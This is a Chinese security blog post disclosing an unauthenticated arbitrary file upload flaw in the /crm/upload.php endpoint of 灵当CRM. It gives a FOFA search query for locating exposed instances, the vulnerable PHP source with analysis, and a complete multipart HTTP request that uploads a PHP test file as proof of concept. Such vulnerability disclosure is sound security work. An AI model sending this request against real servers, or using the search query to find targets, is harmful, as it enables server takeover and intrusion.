---
title: "灵当CRM /crm/upload.php 文件上传漏洞"
source: https://mrxn.net/jswz/51mis-upload-rce.html
asset_dir: assets/灵当crm-crmupload.php-文件上传漏洞
---

# 灵当CRM /crm/upload.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/19 18:06
- 1015浏览
- [0评论](#comment)
- 34分钟阅读

深入探索

传输层安全性协议

软件

VPN服务

---

# 漏洞简介

灵当CRM是一款专为中小企业打造的智能客户关系管理工具，由上海灵当信息科技有限公司开发并运营。广泛应用于金融、教育、医疗、IT服务、房地产等多个行业领域，帮助企业实现客户个性化管理需求，提升企业竞争力。无论是新客户开拓、老客户维护，还是销售过程管理、服务管理等方面，灵当CRM都能提供全面、高效的解决方案。灵当CRM /crm/upload.php 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "文件上传")漏洞，未经身份验证的攻击者可通过该漏洞在服务器端写入后门，任执行意代码，获取服务器权限，进而控制整个 web 服务器。

# 影响版本

# fofa语法

> `body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")`

# 漏洞分析

直接看 /crm/upload.php 业务逻辑实现

```
<?php
/*********************************************************************************
 * diony
 * 上传录音文件
 * 2014-10-21
 ********************************************************************************/
  $http_host=$_SERVER['HTTP_HOST'];
  if(strpos($http_host,"http://")!==false&&strpos($http_host,"http://")<=5)
  {
            $http_host=substr($http_host,strlen("http://"));

  }
 if(strpos($http_host,"https://")!==false&&strpos($http_host,"https://")<=5)
 {
            $http_host=substr($http_host,strlen("https://"));

 }

 if(strpos($http_host,"www.")!==false&&strpos($http_host,"www.")<=5)
 {
            $http_host=substr($http_host,strlen("www."));

 }
 $http_host=trim($http_host);

require_once('includefile.php');
//include('include/database/PearDatabase.php');
//include('include/DatabaseUtil.php');
//header("Content-type: text/html; charset=utf-8");

global $adb;
require_once("Register/RegOp.php");
$Time = date("Ymd");
$regop=RegOp::getInstance();

//$callcenter_interface=$regop->GetcallcenterInterfaceStatus();

if(!file_exists('recordData'))
{
    mkdir('recordData',0777);

}
if(!file_exists('recordData/'.$Time))
{
    mkdir('recordData/'.$Time,0777);
}

if(is_array($_FILES))
{
    $key= key($_FILES);

    $original_name=$_FILES[$key]["name"];
    FileFileterString($original_name);
    if($_FILES[$key]['error'] != UPLOAD_ERR_OK)
    {

        echo "上传失败！";
        exit();
    }
    else
    { 

        if(stripos($_SERVER['HTTP_HOST'],'xiaoshou360.com/XS/penghua')!==false)
        {
            move_uploaded_file($_FILES[$key]['tmp_name'] , "recordData/$Time/$original_name"); 
        }
         else if(stripos($_SERVER['HTTP_HOST'],'xiaoshou360.com/chongwen')!==false)
        {
            move_uploaded_file($_FILES[$key]['tmp_name'] , "recordData/$Time/$original_name"); 
        }
       else  if(strtolower($http_host)=='kehu001.com'||strtolower($http_host)=='51mis.com.cn'||strtolower($http_host)=='xiaoshou360.com')
            {
                //51mis.com.cn/gandan 电话管家上传录音导致服务器卡死

            } 
            else
                     move_uploaded_file($_FILES[$key]['tmp_name'] , "recordData/$Time/$original_name"); 
        include(globalStatic::$root_directory.'modules/Accounts/SaveCallButler.php');

        echo '上传成功！';
    }

}

exit();

?>
```

根据 `$_FILES` 数组获取上传文件，将其保存到指定目录中,无任何过滤处理，导致任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")。

而上传目录 根据一下代码可知

```
$Time = date("Ymd");
if (!file_exists('recordData/' . $Time)) {
    mkdir('recordData/' . $Time, 0777);
}
move_uploaded_file($_FILES[$key]['tmp_name'] , "recordData/$Time/$original_name");
```

最终上传后的文件路径为 /crm/recordData/20241017/test.php 这种格式

# 漏洞复现

```
POST /crm/upload.php HTTP/1.1
Host: 51mis.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/x-php

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundaryABC123--
```

访问文件 /crm/recordData/20241017/test.php

[![灵当CRM /crm/upload.php 文件上传漏洞](images/img-001-43147e63343d.webp)](https://image.mrxn.net/b36dd68a03b44419acf52f9001977c76.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
